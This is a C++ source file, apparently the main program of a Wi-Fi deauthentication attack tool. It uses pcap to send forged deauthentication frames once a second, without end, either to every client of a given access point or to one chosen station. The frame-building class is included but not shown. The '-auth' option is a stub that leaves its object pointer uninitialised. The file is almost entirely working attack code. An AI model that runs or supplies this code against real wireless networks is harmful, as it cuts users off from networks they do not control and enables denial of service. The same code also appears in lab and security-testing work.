#include <iostream>
#include <pcap.h>
#include <unistd.h>
#include "CDeauthAttack.h"

void usage()
{
    std::cerr << "syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]" << std::endl;
    std::cerr << "sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB" << std::endl;
}

void printErrorInterface(char* strErr)
{
    std::cerr << strErr << std::endl;
    std::cerr << "Check  Interface Or Permission" << std::endl;
}

void sendPacket(pcap_t* handle, CDeauthenticationAttack* deauth)
{
    while(true)
    {
        BYTE* packet = deauth->getDeauthenticationPacket();
        int len = deauth->getDeauthenticationPacketSize();
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), len);
        sleep(1);
    }
}

int main(int argc, char* argv[])
{
    if(argc < 3)
    {
        usage();
        return -1;
    }
    
    char* interface = argv[1];
    char strErr[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1, strErr);
    
    // 해당 인터페이스가 없거나 권한이 없는 경우우
    if(handle == nullptr)
    {
        printErrorInterface(strErr);
        return -1;
    }
    
    CDeauthenticationAttack* deauth;
    
    // BroadCast
    switch (argc)
    {
    case 3: // BroadCast
        deauth = new CDeauthenticationAttack(argv[2]);
        break;
    
    case 4: // Unicast
        deauth = new CDeauthenticationAttack(argv[2], argv[3]);
        break;
    
    case 5: // Auth

        break;
    default:
        usage();
        return -1;
    }

    sendPacket(handle, deauth);
    return 0;
}